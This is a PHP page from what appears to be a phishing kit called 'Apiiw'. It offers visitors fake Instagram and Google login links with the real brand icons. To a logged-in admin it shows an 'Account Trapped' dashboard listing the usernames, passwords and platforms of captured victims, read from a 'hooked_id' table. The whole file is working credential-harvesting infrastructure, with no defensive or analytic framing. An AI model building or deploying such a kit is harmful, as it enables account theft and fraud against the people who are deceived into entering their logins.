<?php
session_start();
require"./connection.php";
$res = mysqli_query($conn, "SELECT * FROM hooked_id");
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="./css/home.css">
        <title>Apiiw</title>
    </head>
    <body>
        <div class="container">
            <?php if(!isset($_SESSION['login'])):?>
            <div class="nav">
                <a href="./admin/index">Login Admin</a>
            </div>
            <?php elseif(isset($_SESSION['login'])):?>
                <div class="nav">
                <a href="./admin/indexout">Logout</a>
            </div>
            <?php endif;?>
            <div class="main">
            <?php if(!isset($_SESSION['login'])):?>
                <a href="./instagram">
                    <img src="https://static.cdninstagram.com/rsrc.php/yv/r/BTPhT6yIYfq.ico">
                    <span>Instagram Login</span>
                </a>
                <a href="./google">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg">
                    <span>Google Login</span>
                </a>
                <?php elseif(isset($_SESSION['login'])):?>
                    <div class="logged">
                        <div class="header">
                            <h1>Account Trapped</h1>
                        </div>
                        <div class="body-log">
                        <?php while($row = mysqli_fetch_assoc($res)){?>
                            <div class="card">
                                <h4>Username:  <?= $row['username']?></h4>
                                <h4>Password: <?= $row['password'];?></h4>
                                <h4>Platform: <?= $row['platform'];?></h4>
                            </div>
                        <?php }?>
                        </div>
                    </div>
                <?php endif;?>
            </div>
        </div>
    </body>
</html>
